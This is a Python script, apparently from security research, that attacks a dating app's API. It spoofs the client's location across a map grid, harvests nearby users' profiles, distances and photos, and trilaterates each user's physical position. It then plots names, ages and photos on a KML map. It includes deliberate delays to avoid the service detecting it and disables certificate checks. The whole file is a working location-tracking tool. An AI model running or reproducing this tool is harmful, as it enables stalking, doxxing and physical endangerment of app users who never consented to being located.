#!/usr/bin/env python

# Summary: This script scan for an specified area of a map and gather data from the "XXXX" dating app
#          around some coordinates or city. Then, it uses the information gathered to geolocate the users in the grid
#          using trilateration.
# Author: Felipe Molina (@felmoltor)
# Date: 2021-04

# General libraries
import os,sys
from pathlib import Path
import csv
from optparse import OptionParser
import math
from time import sleep
from random import randint,uniform
import matplotlib.pyplot as plt
import json
import requests
from datetime import datetime
from urllib.parse import urlparse
import urllib3
urllib3.disable_warnings()
import re
from ColorMessages import *
import pandas as pd
# Geographic Libraries
from shapely import geometry
import utm
from shapely.geometry import LineString
import simplekml
from polycircles import polycircles

# Important URLs in the app
AUT_GEOLOC="https://api.sampledatingapp.com/api/v4/geoloc"
AUT_GET_NEARBY="https://api.sampledatingapp.com/api/v4/geoloc?page[limit]=<N_USERS>&include=user&fields[user]=basic"
AUT_GET_USERINFO="https://api.sampledatingapp.com/api/v4/users/<USER_ID>?fields%5Buser%5D=basic%2Cothers%2Chashtags%2Cpictures%2Castro&include=hashtags%2Cpictures"

SKEWED_DEGREES=0.005
USER_AGENT="SampleDatingApp/4.5.1:524 (Android 6.0.1; Xiaomi; MI 5s; Build/MXB48T; Store)"
COOLDOWN=50        # Cooldown time (in seconds) before asking AUT again for the same username
DWPHOTO_COOLDOWN=3 # Cooldown between photo downloads to prevent detection
FOUND_COOLDOWN=5   # Cooldown time (in seconds) before asking AUT for a new geo position around the target username
COOLDOWN_BASE=5
MAX_COOLDOWN=400
OK_THRESHOLD=10     # Distance to stop querying AUT for the target user
CIRCLE_RESOLUTION=180
TRACKING_FILE="data/sampledatingapp-tracking.csv"
GOOGLE_EARTH_PATH="/usr/bin/google-earth-pro"

class DatingAppUser():
    def __init__(self):
        self.id=None
        self.pseudo=None
        self.online=None
        self.sex=None
        self.title=None
        self.age=None
        self.city=None
        self.cover=None # This is the URL where the photo is stored. We have to append "/full" at the end to get the full photo
        self.dead=None
        self.count_pics=None
        self.timestamp=None
        self.latitude=None
        self.longitude=None
        self.distance=None
        self.photo_path=None # The photo location on our hard drive
        self.found=False

def get_options():
    parser = OptionParser()
    parser.add_option("-u", "--username", dest="username",
                    help="Login username", default=None)
    parser.add_option("-p", "--password", dest="password",
                    help="Password", default=None)
    parser.add_option("--start-coords", dest="start_coords",
                    help="Starting coordinates of the map grid", default=None)
    parser.add_option("--stop-coords", dest="stop_coords",
                    help="Stoping coordinates of the map grid", default=None)
    parser.add_option("-A", "--analysisonly", dest="analysis_only",
                    help="Only analyse the database of our hard drive", default=False, action="store_true")
    parser.add_option("-d", "--database", dest="database",
                    help="Database file name", default="data/scans/app2database.csv")
    parser.add_option("-o", "--output", dest="output",
                    help="Output file name", default="data/scans/app2scan.csv")
    parser.add_option("-k", "--kml", dest="kml",
                    help="Output KML path", default="output/scans/app2scans.kml")
    parser.add_option("-R", "--resolution", dest="grid_resolution",
                    help="Grid resolution. A.K.A. number of GPS probes per row and colum", default=3)
    parser.add_option("-t", "--no-photos", dest="no_photos",
                    help="Enable to prevent downloading photos (default: False)", action="store_true", default=False)
    parser.add_option("-n", "--nresults", dest="n_results",
                    help="Number of results to retrieve from the servers", default=50)
    parser.add_option("-P", "--proxy", dest="proxy",
                    help="Proxy to send the requests through (default: None)", default=None)
    parser.add_option("-q", "--quiet",
                    action="store_false", dest="verbose", default=True,
                    help="don't print status messages to stdout")

    (options, args) = parser.parse_args()
    return options

# Formula extracted from https://stackoverflow.com/questions/7477003/calculating-new-longitude-latitude-from-old-n-meters
# If we get to close to the poles ir radius is very big, this will fail
def getPerimeterPoint(center,dx,dy):
    r_earth = 6378000 # 6378 Km of radius = 6378000 metres
    # Number of Km per degree of longitude
    # (2*math.pi/360) * r_earth * cos(point.latitude)
    # Number of Km per degree of latitude
    # ((2*math.pi)/360) * r_earth = 111 km / degree 
    new_latitude  = center.y  + (dy / r_earth) * (180.0 / math.pi)
    new_longitude = center.x + (dx / r_earth) * (180.0 / math.pi) / math.cos(center.y * math.pi/180.0)
    return geometry.Point(new_latitude,new_longitude)

# This function will return the poligon drawing the circle around the center point with a radius of r
def getCirclePoints(center,radius,resolution=180):
    perimeter_points=[]
    # Iterate through the number of points around the center
    for n in range(1,resolution+1):
        # Divide the 360 degrees of a circle in "resolution" samples
        degree=n*(360.0/resolution)
        dx=math.cos(math.radians(degree))*radius
        dy=math.sin(math.radians(degree))*radius
        ppoint=(getPerimeterPoint(center,dx,dy))
        perimeter_points.append(ppoint)
    
    poly = geometry.Polygon([[p.x, p.y] for p in perimeter_points])
    return poly

def drawTargetKml(input_file,kml_file,session,open_kml=True):
    kml=simplekml.Kml()

    with open(input_file,"r") as csv_file:
        csv_reader = csv.reader(csv_file, delimiter=',')

        measure_n=0
        for row in csv_reader:
            measure_n+=1
            min_epoch=int(row[0])
            max_epoch=int(row[1])
            latitude=float(row[2])
            longitude=float(row[3])
            user_id=int(row[4])
            user_name=row[5]
            user_age=int(row[6])
            fname=row[7]
            
            # Set up point parameters
            d1=datetime.fromtimestamp(min_epoch).strftime('%Y-%m-%d %H:%M:%S')
            d2=datetime.fromtimestamp(max_epoch).strftime('%Y-%m-%d %H:%M:%S')
            description="%s (%s) Age %s\nDates between %s and %s\n" % (user_name,user_id,user_age,d1,d2)
            point_name="%s (%s)" % (user_name,user_id)
            target_point=kml.newpoint(name=point_name)
            target_point.coords=[(longitude,latitude)]
            if (os.path.exists(fname)):
                target_point.description='%s<br/><img src="%s" alt="Target Photo" align="left" width=150 height=250 />' % (description,fname)
            else:
                target_point.description='%s<br/>' % (description)
   
    kml.save(kml_file)

    # If open is true, open with Google Earth
    if (open_kml):
        if (os.path.exists(GOOGLE_EARTH_PATH)):
            os.system('xdg-open %s' % kml_file)
        else:
            print("Google Earth path not found. Open the file '%s' manually to see the location of the target.")

def getDatingAppUserData(target_id,session,download_picture=False):
    user=None

    URL=AUT_GET_USERINFO.replace("<USER_ID>",str(target_id))
    user_resp=session.get(URL)

    if (user_resp.status_code==200):
        user=DatingAppUser()
        # fill the data of the user variable
        json_user=json.loads(user_resp.text)
        attrs=json_user["data"][0]["attributes"]["basic"]
        user.id=json_user["data"][0]["id"]
        user.pseudo=attrs["pseudo"]
        user.online=attrs["online"]
        user.sex=attrs["sex"]
        user.title=attrs["title"]
        user.age=attrs["age"]
        user.city=attrs["city"]
        user.cover=attrs["cover"] # This is the URL where the photo is stored. We have to append "/full" at the end to get the full photo
        user.dead=attrs["dead"]
        user.count_pics=attrs["count_pics"]
        user.timestamp=attrs["timestamp"]
        user.latitude=None
        user.longitude=None
        user.from_point=None
        user.distance=None
        user.photo_path=None # The photo location on our hard drive
        user.found=False
        
        fname=Path("images/aut/%s_%s.jpg" % (user.pseudo,user.id)).absolute()
        if (os.path.exists(fname)):
            info("Photo of user %s was already downloaded. Skiping" % (user.pseudo))
            user.photo_path=fname
        else:
            if (download_picture):
                # Download user photo
                if (user.cover is not None):
                    photo_resp=session.get(re.sub("$","/full",user.cover),stream=True)
                    if (photo_resp.status_code==200):
                        with open(fname, 'wb') as f:
                            info("Downloading photo of user %s" % (user.pseudo))
                            f.write(photo_resp.content)
                        user.photo_path=fname
                else:
                    user.photo_path="None"
                
                # We force a sleep to prevent AUT from detecting us
                info("Sleeping %s seconds before downloading next user's photo." % DWPHOTO_COOLDOWN)
                sleep(DWPHOTO_COOLDOWN)

    return user

def spoofMyLocation(latitude,longitude,session):
    # To spoof our location in AUT app, we need to POST to /api/v4/geoloc the following data:
    # geo%5Blat%5D=<LAT>&geo%5Blng%5D=<LONG>
    data= {
        "geo[lat]":str(latitude),
        "geo[lng]":str(longitude)
    }
    coords_headers={
        "X-Lat": str(latitude),
        "X-Lng": str(longitude)
    }
    # Send our location to the server
    session.headers.update(coords_headers)
    geo_resp=session.post(AUT_GEOLOC,data=data,headers=coords_headers)
    if (geo_resp.status_code==202):
        json_resp=json.loads(geo_resp.text)
        # If the string " ha sido guardada" is present in the response
        if (" ha sido guardada" in json_resp["meta"]["message"]):
            return True
        else:
            return False
    else:
        print("Error spoofing our geolocation (%s)" % geo_resp.status_code)
        return False

def getAUTNearbyPeople(center,session):
    # Request list of people "around you"
    people_resp=session.get(AUT_GET_NEARBY)
    if (people_resp.status_code==200):
        json_resp=json.loads(people_resp.text)
        return json_resp["data"]        
    else:
        print("Error retrieving list of people nearby (%s)" % people_resp.status_code)
        return None

# This function return the a different cooldown time for each iteration following the exponential backoff retry
def get_cooldown(n):
    return min(MAX_COOLDOWN,COOLDOWN_BASE*(math.pow(2,n-1)))

# This function retrieves the user details and distances around one point
# It compare the results with the last iteration to see if we have to wait a little to ask the server again
def saveUsersAround(point,session,output,download_picture=False):   
    # Spoof our own location before requesting the list of users
    location_spoofed=False
    # Attempt to spoof our own location in a while loop
    while (not location_spoofed):
        location_spoofed=spoofMyLocation(point.y,point.x,session)
        if(location_spoofed):
            info("Successfuly spoofed our location to the position %s,%s" % (point.y,point.x))
        else:
            error("Error spoofing our own location. Trying again in %s seconds." % COOLDOWN)
            sleep(COOLDOWN) 
    
    # Now, request the list of people nearby
    now_epoch=int(datetime.now().timestamp())
    with open(output,"a+") as out:
        users_json=getAUTNearbyPeople(point,session)
        count=0
        for user_entry in users_json:
            user_id=user_entry["id"]
            user=getDatingAppUserData(user_id,session,download_picture=download_picture)
            user.distance=float(user_entry["attributes"]["distance"])*1000
            # Save the data of the user in the database
            csvwriter=csv.writer(out,delimiter=",")
            data_array=(now_epoch,point.y,point.x,user.distance,user.id,user.pseudo,user.age,user.timestamp,user.photo_path)
            csvwriter.writerow(data_array)
            count+=1
    return len(users_json)


################

if __name__ == "__main__":
    # Parsing options
    options=get_options()
    init_point=None
    
    if (options.start_coords is not None and options.stop_coords is not None):
        # Calculate the scanning grid
        (slat,slong)=[float(c.strip()) for c in options.start_coords.split(",")]
        (elat,elong)=[float(c.strip()) for c in options.stop_coords.split(",")]
    else:
        error("Error. You have to specify the starting and ending coordinates of the grid to scan (--start-coords and --stop-coords).")
        exit(1)

    # Check if the database and output files already exists
    owd=owo=False
    if (os.path.exists(options.database)):
        owd=((input("Database file %s already exists. Do you want to overwrite it (selecting N will append data) [y/N]: " % options.database)).upper() == "Y")
        if (owd):
            os.remove(options.database)

    if (os.path.exists(options.output)):
        owo=((input("Output file %s already exists. Do you want to overwrite it (selecting N will append data) [y/N]: " % options.output)).upper() == "Y")
        if (owo):
            os.remove(options.output)
    
    # Set up requests library session
    session = requests.Session()
    session.headers.update({'User-Agent': USER_AGENT})
    session.headers.update({'X-Platform': "android"})
    session.headers.update({'X-Client-Version': "4.3.21:509"})
    session.auth = (options.username,options.password)
    session.verify = False

    # If proxy is specified
    if (options.proxy is not None):
        m = re.match("https?:\/\/([^:]*):(\d{1,4})?\/?",options.proxy)
        if (m is not None):
            proxies = {
                'http': options.proxy,
                'https': options.proxy,
            }
            session.proxies.update(proxies)
        else:
            error("Specified proxy does not follow the pattern http(s)://ip:port/. Ignoring it.")

    
    # Adjust the number of results asked to the server
    AUT_GET_NEARBY=AUT_GET_NEARBY.replace("<N_USERS>",options.n_results)
    
    ##################
    # Start scanning #
    ##################
    
    if (not options.analysis_only):
        # To unify criteria, we want to scan north to south and west to east
        if (slat-elat)<0:
            # ending latitude is north to the starting lat
            # Swaping starting and ending latitude
            s=slat
            slat=elat
            elat=s
        if (slong-elong)>0:
            # Ending longitude is to the west of the starting long
            s=slong
            slog=elong
            elong=s
        
        # If no increments have been specified on the arguments
        # we calculate the increments as a GRID_RESOLUTION delta on each coordinate
        lat_diff=abs(slat-elat)
        long_diff=abs(slong-elong)
        lat_delta=lat_diff/float(options.grid_resolution)
        long_delta=long_diff/float(options.grid_resolution)

        # scan north to south , west to east
        cp=geometry.Point([float(slong),float(slat)]) # x,y
        while (cp.y>=elat): 
            cp=geometry.Point([float(slong),cp.y]) # x,y
            while (cp.x<=elong): # west to east
                # Scan nearby for users
                info("Scanning for users around %s,%s..." % (cp.y,cp.x))
                n_users=saveUsersAround(cp,session,options.database,download_picture=(not options.no_photos))
                info("Found %s users" % n_users)
                # Move the current probing point to the east (+)
                cp=geometry.Point([cp.x+long_delta,cp.y]) 
                c=get_cooldown(1)
                info("Sleeping %s seconds" % c)
                sleep(c)
            
            # Move the current probing point to the south (-)
            cp=geometry.Point([cp.x,cp.y-lat_delta]) 

    ############################
    # Analysis of the database #
    ############################

    # Now, draw the users of the social network in a map
    geo_data = pd.read_csv(options.database,names=["epoch","lat","long","distance","id","pseudo","age","last_connection","profile_image"])
    
    # Delete duplicated rows, taking only in account the distance and the user ID. Those could be invalid measures sent by the server
    geo_data.drop_duplicates(subset=["distance","id"],inplace=True,ignore_index=True)
    # For each user ID in the database, find at least three probes where the user was located
    for user_id in geo_data.id.unique():
        user_hits=geo_data[geo_data.id==user_id]
        row=user_hits[0:1]
        if (len(user_hits)<3):
            info("User %s (%s) found less than three times in the scan. Ignoring." % (user_id,row.pseudo.values[0]))
        else:
            # Use only the first three rows of the subset for the calculation of the position
            resulting_rows=user_hits[:3]
            # Calculate the three circles
            row1=resulting_rows[0:1]
            row2=resulting_rows[1:2]
            row3=resulting_rows[2:3]
            ce1=geometry.Point([float(row1.long),float(row1.lat)]) 
            ce2=geometry.Point([float(row2.long),float(row2.lat)]) 
            ce3=geometry.Point([float(row3.long),float(row3.lat)]) 
            c1=getCirclePoints(ce1,float(row1.distance),resolution=CIRCLE_RESOLUTION)
            c2=getCirclePoints(ce2,float(row2.distance),resolution=CIRCLE_RESOLUTION)
            c3=getCirclePoints(ce3,float(row3.distance),resolution=CIRCLE_RESOLUTION)
            # Intersect the three circles and mark the closest intersections as the potential location of the user 
            # The intersection between three circles give us 6 intersection points
            # inter12 contains the two intersection points between circle 1 and 2
            # inter23 contains the two intersection points between circle 3 and 3
            # inter13 contains the two intersection points between circle 1 and 3
            circle1_points=LineString(list(c1.exterior.coords))
            circle2_points=LineString(list(c2.exterior.coords))
            circle3_points=LineString(list(c3.exterior.coords))

            
            # Intersect circle 1 and 2
            if (c1.intersects(c2)):
                inter12=circle1_points.intersection(circle2_points)
            else:
                error("Error. Circle 1 and 2 don't intersect. Maybe the target has moved?. Skipping to the next user")
                continue
            
            # Intersect circle 2 and 3
            if (c2.intersects(c3)):
                inter23=circle2_points.intersection(circle3_points)
            else:
                error("Error. Circle 2 and 3 don't intersect. Maybe the target has moved?. Skipping to the next user")
                continue
           
            # Intersect circle 1 and 3
            if (c1.intersects(c3)):
                inter13=circle1_points.intersection(circle3_points)
            else:
                error("Error. Circle 1 and 3 don't intersect. Maybe the target has moved?. Skipping to the next user")
                continue

            # Now, to detect the closerpoints of the 6 intersections, the algorithm
            # 1. Calculate intersections iter12 (candidate1,candidate2)
            # 2. Calculate intersections iter23 (i231,i232)
            # 2. Calculate intersections iter23 (i131,i132)
            # 3. Calculate distances of i231 and i232 to candidate1 ==> d1, d2
            # 4. Select the minimum of these to distances ==> min_d1
            # 5. Calculate distances of i231 and i232 to candidate2 ==> d3, d4
            # 6. Select the minimum of these to distances ==> min_d2
            # 7. Select the min of min_d1 and min_d2 ==> min_d1d2
            # 8. Calculate distances of i131 and i132 to candidate1 ==> d5, d6
            # 4. Select the minimum of these to distances ==> min_d3
            # 5. Calculate distances of i131 and i132 to candidate2 ==> d7, d8
            # 6. Select the minimum of these to distances ==> min_d4
            # 7. Select the min of min_d3 and min_d4 ==> min_d3d4
            if (inter23.__class__ == geometry.LineString or inter12.__class__ == geometry.LineString or inter13.__class__ == geometry.LineString):
                error("The intersection of any of the three circles failed. Skipping to the next user.")
                continue
            else: 
                (candidate1,candidate2)=inter12

                dist_c1_i23_1=candidate1.distance(inter23[0])
                dist_c1_i23_2=candidate1.distance(inter23[1])
                dist_c2_i23_1=candidate2.distance(inter23[0])
                dist_c2_i23_2=candidate2.distance(inter23[1])

                dist_c1_i13_1=candidate1.distance(inter13[0])
                dist_c1_i13_2=candidate1.distance(inter13[1])
                dist_c2_i13_1=candidate2.distance(inter13[0])
                dist_c2_i13_2=candidate2.distance(inter13[1])
                selector = {
                    # intersections circles 2 and 3
                    dist_c1_i23_1:inter23[0],
                    dist_c1_i23_2:inter23[1],
                    dist_c2_i23_1:inter23[0],
                    dist_c2_i23_2:inter23[1],
                    # intersections circles 1 and 3
                    dist_c1_i13_1:inter13[0],
                    dist_c1_i13_2:inter13[1],
                    dist_c2_i13_1:inter13[0],
                    dist_c2_i13_2:inter13[1],
                }

                inter23_min=min(dist_c1_i23_1,dist_c1_i23_2,dist_c2_i23_1,dist_c2_i23_2)
                inter13_min=min(dist_c1_i13_1,dist_c1_i13_2,dist_c2_i13_1,dist_c2_i13_2)

                # Save the intersection points
                p23 = selector[inter23_min]
                p13 = selector[inter13_min]
                fc1=fc2=fc=None
                # What would be the the suposed cadidate location point if we look to the intersections between c2 and c3
                if (inter23_min == dist_c1_i23_1 or inter23_min == dist_c1_i23_2):
                    fc1=candidate1
                else:
                    fc1=candidate2
                # What would be the the suposed cadidate location point if we look to the intersections between c1 and c3
                if (inter13_min == dist_c1_i13_1 or inter13_min == dist_c1_i13_2):
                    fc2=candidate1
                else:
                    fc2=candidate2
                # Error control
                if (fc1 != fc2):
                    error("%s (%s): Some fuckery happened when calculating the location candidate point. Ignoring this user." % (user_id,row1.name.values[0]))
                else:
                    fc=fc1
                    # Create a poligon with vertices in fc,p13 and p23 and the centroid will be the potential location of the user
                    pointList = [fc, p13, p23, fc]
                    poly = geometry.Polygon([[p.x, p.y] for p in pointList])
                    centroid=poly.centroid
                    # I don't know but the intersection() call returns X and Y coordinates switched, so we restore here the correct order: X=Longitude and Y=Latitude
                    potential_location=geometry.Point([float(centroid.y),float(centroid.x)])
                    success("%s (%s): Sucesfully located the user in %s,%s." % (int(row1.id),row1.pseudo.values[0],float(potential_location.y),float(potential_location.x)))
                    # Save the data in the output file
                    with open(options.output,"a") as out:
                        max_time=resulting_rows.epoch.max()
                        min_time=resulting_rows.epoch.max()
                        csvwriter=csv.writer(out,delimiter=",")
                        data_array=(min_time,max_time,potential_location.y,potential_location.x,int(row1.id),row1.pseudo.values[0],int(row1.age),row1.profile_image.values[0])
                        csvwriter.writerow(data_array)


    # Finished gathering user data, now to draw the KML    
    print("Generating the result KML file")
    drawTargetKml(options.output,options.kml,session,open_kml=True)

